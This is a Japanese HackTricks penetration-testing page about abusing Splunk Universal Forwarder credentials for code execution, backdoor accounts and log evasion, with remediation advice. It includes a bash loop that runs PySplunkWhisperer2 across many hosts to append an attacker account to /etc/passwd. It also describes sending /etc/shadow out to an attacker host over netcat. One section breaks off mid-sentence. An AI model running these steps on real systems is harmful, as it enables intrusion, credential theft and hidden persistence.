<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手**したいですか、またはHackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


**内部**または**外部**のマシンを**列挙**している場合、**Splunkが実行されている**ことを発見します（ポート8090）。もし幸運にも**有効な資格情報**を知っている場合、Splunkサービスを**悪用**して、Splunkを実行しているユーザーとして**シェルを実行**することができます。rootが実行している場合、特権をrootにエスカレーションすることができます。

また、すでにrootであり、Splunkサービスがlocalhost以外でリッスンしていない場合、Splunkサービスから**パスワード**ファイルを**盗む**ことができ、パスワードを**クラック**するか、新しい資格情報を追加することができます。そして、ホスト上で持続性を維持します。

最初の画像では、Splunkdのウェブページの見た目が示されています。

**以下の情報は、**[**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)からコピーされました。

# シェルと持続性のためのSplunk Forwardersの悪用

2020年8月14日

## 説明：<a href="#description" id="description"></a>

Splunk Universal Forwarder Agent（UF）は、認証されたリモートユーザーがSplunk APIを介してエージェントに単一のコマンドまたはスクリプトを送信できるようにします。UFエージェントは、接続が有効なSplunk Enterpriseサーバーから来ているかどうかを検証せず、コードが署名されているか、またはSplunk Enterpriseサーバーからのものであることを証明することもありません。これにより、UFエージェントのパスワードにアクセス権を持つ攻撃者は、オペレーティングシステムに応じて、サーバー上でSYSTEMまたはrootとして任意のコードを実行できます。

この攻撃は、ペネトレーションテスターによって使用され、悪意のある攻撃者によって実際に悪用されている可能性があります。パスワードを取得することで、顧客環境内の数百のシステムが危険にさらされる可能性があります。

Splunk UFのパスワードは比較的簡単に取得できます。詳細については、「共通のパスワードの場所」セクションを参照してください。

## コンテキスト：<a href="#context" id="context"></a>

Splunkは、セキュリティ情報およびイベント監視（SIEM）システムとしてよく使用されるデータ集約および検索ツールです。Splunk Enterprise Serverは、サーバー上で実行されるWebアプリケーションであり、ネットワーク内のすべてのシステムにインストールされるUniversal Forwardersと呼ばれるエージェントがあります。Splunkは、Windows、Linux、Mac、およびUnix向けのエージェントバイナリを提供しています。多くの組織は、Linux/Unixホストにエージェントをインストールする代わりに、Syslogを使用してデータをSplunkに送信しますが、エージェントのインストールがますます人気を集めています。

Universal Forwarderは、各ホストでhttps://host:8089でアクセスできます。 /service/などの保護されたAPI呼び出しにアクセスすると、Basic認証ボックスが表示されます。ユーザー名は常にadminであり、パスワードのデフォルトは2016年までchangemeでした。その後、Splunkは新しいインストールに8文字以上のパスワードを設定する必要がありました。デモで示すように、複雑さは要件ではありません。私のエージェントのパスワードは12345678です。リモート攻撃者は、ロックアウトせずにパスワードをブルートフォースできます。これはログホストの必要性です。なぜなら、アカウントがロックアウトされた場合、ログはSplunkサーバーに送信されなくなり、攻撃者はこれを使用して攻撃を隠すことができます。次のスクリーンショットは、Universal Forwarderエージェントを示しています。この初期ページは認証なしでアクセスでき、Splunk Universal Forwarderを実行しているホストを列挙するために使用できます。

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

Splunkのドキュメントでは、すべてのエージェントに同じUniversal Forwardingパスワードを使用することが示されています。個々のエージェントごとにパスワードを設定できるかどうかは確かではありませんが、ドキュメントとSplunk管理者だったときの記憶に基づいて、すべてのエージェントは同じパスワードを使用する必要があると思われます。したがって、パスワードが1つのシステムで見つかるかクラックされると、すべてのSplunk UFホストで機能する可能性が高いです。これは私の個人的な経験ですが、数百のホストを迅速に危険にさらすことができます。

## 共通のパスワードの場所<a href="#common-password-locations" id="common-password-locations"></a>

ネットワーク上の以下の場所で、Splunk Universal Forwardingエージェントの平文パスワードをよく見つけます。

1. Active Directory Sysvol/domain.com/Scriptsディレクトリ。管理者は、効率的なエージェントのインストール
## 影響: <a href="#impact" id="impact"></a>

Splunk Universal Forward Agentのパスワードを持つ攻撃者は、ネットワーク内のすべてのSplunkホストを完全に侵害し、各ホストでSYSTEMまたはrootレベルの権限を取得することができます。私はSplunkエージェントをWindows、Linux、およびSolaris Unixホストで成功裏に使用しています。この脆弱性により、システムの資格情報がダンプされ、機密データが持ち出され、ランサムウェアがインストールされる可能性があります。この脆弱性は、高速で使いやすく、信頼性があります。

Splunkはログを処理するため、攻撃者は最初のコマンド実行時にUniversal Forwarderの場所を変更して、Splunk SIEMへのログ記録を無効にすることができます。これにより、クライアントのBlue Teamによる発見の可能性が大幅に低下します。

Splunk Universal Forwarderは、ログ収集のために頻繁にドメインコントローラにインストールされており、これにより攻撃者はNTDSファイルを抽出したり、さらなる攻撃のためにアンチウイルスを無効にしたり、ドメインを変更したりすることが容易になります。

最後に、Universal Forwarding Agentはライセンスを必要とせず、パスワードスタンドアロンで構成することができます。そのため、Splunkを使用しない顧客であっても、この合法的なアプリケーションをホスト上のバックドア持続性メカニズムとしてインストールすることができます。

## 証拠: <a href="#evidence" id="evidence"></a>

攻撃例を示すために、最新のSplunkバージョンを使用してEnterprise ServerとUniversal Forwarding Agentのテスト環境をセットアップしました。以下の10枚の画像がこのレポートに添付されており、次の内容を示しています：

1- PySplunkWhisper2を介して/etc/passwdファイルをリクエストする

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Netcatを介して攻撃者システムに/etc/passwdファイルを受信する

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- PySplunkWhisper2を介して/etc/shadowファイルをリクエストする

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Netcatを介して攻撃者システムに/etc/shadowファイルを受信する

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- /etc/passwdファイルにユーザーattacker007を追加する

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- /etc/shadowファイルにユーザーattacker007を追加する

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- attacker007が正常に追加された新しい/etc/shadowファイルを受信する

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- attacker007アカウントを使用して被害者へのSSHアクセスを確認する

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- uid/gidを0に設定したユーザーroot007をバックドアのルートアカウントとして追加する

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- attacker007を使用してSSHアクセスを確認し、root007を使用してrootにエスカレーションする

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

この時点で、Splunkおよび作成された2つのユーザーアカウントを介してホストへの持続的なアクセスが可能です。リモートログ記録を無効にして自分の行動を隠し、このホストを使用してシステムおよびネットワークへの攻撃を継続することができます。

PySplunkWhisperer2のスクリプト作成は非常に簡単で効果的です。

1. 攻撃したいホストのIPを記載したファイルを作成します。例えば、ip.txtという名前のファイルです。
2. 以下を実行します：
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
ホスト情報：

Splunk Enterprise Server: 192.168.42.114\
Splunk Forwarder Agent Victim: 192.168.42.98\
攻撃者: 192.168.42.51

Splunk Enterpriseバージョン: 8.0.5（2020年8月12日時点での最新バージョン）\
Universal Forwarderバージョン: 8.0.5（2020年8月12日時点での最新バージョン）

### Splunk, Inc.への対策推奨事項: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

以下のすべての解決策を実装することをお勧めします。

1. 理想的には、Universal Forwarderエージェントはポートを開けず、代わりに一定の間隔でSplunkサーバーから指示をポーリングするようにします。
2. クライアントとサーバー間でTLS相互認証を有効にし、各クライアントに個別のキーを使用します。これにより、すべてのSplunkサービス間で非常に高い双方向セキュリティが提供されます。TLS相互認証は、エージェントやIoTデバイスで広く実装されており、これが信頼されたデバイスクライアントからサーバーへの通信の未来です。
3. スクリプトファイルや単一行のコードを、Splunkサーバーによって暗号化および署名された圧縮ファイルで送信します。これにより、APIを介して送信されるエージェントデータ自体は保護されませんが、第三者からの悪意のあるリモートコード実行に対して保護されます。

### Splunkの顧客への対策推奨事項: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Splunkエージェントには非常に強力なパスワードを設定してください。少なくとも15文字のランダムなパスワードを推奨しますが、これらのパスワードは入力されないため、50文字など非常に長いパスワードに設定することもできます。
2. ホストベースのファイアウォールを設定し、Splunkサーバーからのみポート8089/TCP（Universal Forwarderエージェントのポート）への接続を許可します。

## Red Team向けの推奨事項: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. 各オペレーティングシステム用にSplunk Universal Forwarderのコピーをダウンロードしておくと、軽量で署名された侵入ツールとして非常に便利です。Splunkが実際にこれを修正する場合に備えて、コピーを保持しておくと良いでしょう。

## 他の研究者によるエクスプロイト/ブログ <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

使用可能な公開エクスプロイト：

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

関連するブログ記事：

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_**注意:**_ この問題はSplunkシステムにおける深刻な問題であり、他のテスターによって数年間にわたって悪用されてきました。リモートコード実行はSplunk Universal Forwarderの意図的な機能ですが、その実装は危険です。私はSplunkのバグバウンティプログラムを通じてこのバグを提出しようとしましたが、設計上の影響について気づいていない可能性が非常に低いため、バグの詳細を公に議論することはBug Crowd/Splunkの開示ポリシーによって禁止されています。90日の開示期限を要求しましたが、拒否されました。したがって、私は責任を持ってこれを開示しませんでした。Splunkがこの問題に気づいており、無視している可能性が非常に高いため、これは企業に深刻な影響を与える可能性があり、情報セキュリティコミュニティの責任は企業に教育することです。


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンやHackTricksのPDFをダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**または**[telegramグループ](https://t.me/peass)**に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
